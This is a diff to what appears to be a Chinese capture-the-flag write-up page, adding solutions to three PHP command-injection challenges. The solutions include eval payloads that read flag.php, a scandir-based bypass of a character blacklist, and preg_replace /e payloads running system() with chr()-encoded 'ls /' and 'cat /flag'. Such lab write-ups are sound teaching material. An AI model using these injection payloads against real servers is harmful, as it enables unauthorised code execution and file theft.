@@ -342,7 +342,6 @@
         <li><a href="#ezcmd_11">EZCMD_11</a></li>
         <li><a href="#ezcmd_12">EZCMD_12</a></li>
         <li><a href="#ezcmd_13">EZCMD_13</a></li>
-        <li><a href="#ezcmd_14">EZCMD_14</a></li>
       </ol>
     </li>
   </ol>
@@ -464,7 +463,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 9 分钟
+                    阅读时长: 11 分钟
                 </time>
             </div>
         
@@ -481,7 +480,7 @@
 
 
 
-                <span class="article-time--wordcount">4499 字</span>
+                <span class="article-time--wordcount">5080 字</span>
             </div>
         
     </footer>
@@ -2172,10 +2171,177 @@ payload ?qc=echo file_get_contents(&rsquo;/flag.txt&rsquo;)?&gt;<br>
 	
 ></p>
 <h3 id="ezcmd_11">EZCMD_11
-</h3><h3 id="ezcmd_12">EZCMD_12
-</h3><h3 id="ezcmd_13">EZCMD_13
-</h3><h3 id="ezcmd_14">EZCMD_14
-</h3>
+</h3><p>访问靶机<br>
+<img src="https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c33.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+>
+分析条件<br>
+qc 参数会进入 eval($qc),只过滤了分号 ; flag 在 flag.php 里<br>
+直接构造highlight_file(&lsquo;flag.php&rsquo;)?&gt; 读取flag即可<br>
+<img src="https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c34.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h3 id="ezcmd_12">EZCMD_12
+</h3><p>访问靶机<br>
+<img src="https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c35.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+>
+分析条件<br>
+可以看出这题本质是 eval() 代码执行，只是做了一层黑名单过滤.<br>
+被过滤的字符很多，尤其关键的是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39; &#34; ? &lt; &gt; . $ { } : \ ~ ^ @ * - + = [ ] ,
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这意味着：不能直接写 flag.php，因为 . 被过滤。不能方便地写字符串、数组下标、拼接这些常规做法。但函数名、括号、分号、下划线都还能用，所以可以继续走纯 PHP 利用.<br>
+先用目录函数确认当前目录文件:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">print_r(scandir(getcwd()));\
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c36.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+>
+目标是不直接写出 flag.php，而是从 scandir() 返回结果里间接取出它.<br>
+构造：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">next(array_reverse(scandir(getcwd())))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>原因是:<br>
+scandir(getcwd()) 返回 [&rsquo;.&rsquo;,&rsquo;..&rsquo;,&lsquo;flag.php&rsquo;,&lsquo;index.php&rsquo;]  array_reverse() 后变成 [&lsquo;index.php&rsquo;,&lsquo;flag.php&rsquo;,&rsquo;..&rsquo;,&rsquo;.&rsquo;]  next() 取第二个元素，正好就是 flag.php <br>
+虽然 next() 正常要求传引用变量，但这里 error_reporting(0) 把 warning 压掉了，实际仍然能拿到值.<br>
+最终payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">show_source(next(array_reverse(scandir(getcwd()))));
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c37.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h3 id="ezcmd_13">EZCMD_13
+</h3><p>访问靶机<br>
+<img src="https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c38.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+>
+分析条件<br>
+preg_replace() 使用了 /e 修饰符,在 PHP 5.x 里，/e 会把替换内容当成 PHP 代码执行,利用思路是让 \1 替换成我们可控的内容，再借助双引号里的 ${&hellip;} 字符串插值触发函数执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?re=.*&amp;str=${phpinfo()}  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c39.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+>
+可以成功弹出 phpinfo()，说明利用成立<br>
+接着尝试命令执行  PHP 5.6 的特性：未定义常量会被当成字符串.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?re=.*&amp;str=${system(ls)}  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c40.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+>
+回显当前目录只有index.php 说明flag不在当前目录,继续列根目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?re=.*&amp;str=${system(chr(108).chr(115).chr(32).chr(47))}  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c41.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+>
+也就是 ls /  回显里可以看到flag 说明flag在flag文件中  最后读出flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?re=.*&amp;str=${system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))}  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>等价执行了 cat /flag<br>
+<img src="https://cdn.jsdelivr.net/gh/xxchen-yu/blog-images@main/2026/qingcen-web-rumen-wp/c42.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+
 </section>
 
 
